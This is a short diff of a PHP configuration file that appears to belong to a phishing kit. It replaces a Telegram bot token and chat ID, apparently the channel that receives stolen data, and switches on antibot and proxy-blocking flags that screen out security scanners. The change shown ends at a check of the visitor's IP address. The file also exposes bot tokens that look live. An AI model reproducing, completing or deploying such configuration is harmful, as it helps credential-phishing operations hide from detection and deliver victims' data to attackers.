@@ -1,11 +1,11 @@
 <?php
 
-$zbayb = "8380088918:AAFu6MotIQtnUncK23rCKtHv8OMrU0N-PAQ";
-$id = "-5098559291";
+$zbayb = "8796576363:AAGvTaSAMj4MzyNli5h5grWCTMrFsOBSiYc";
+$id = "-5272065278";
 
-$antibot = "no";
+$antibot = "yes";
 
-$block_proxy = "no";
+$block_proxy = "yes";
 
 $ipp = "";
 if($_SERVER['REMOTE_ADDR']=="::1"){
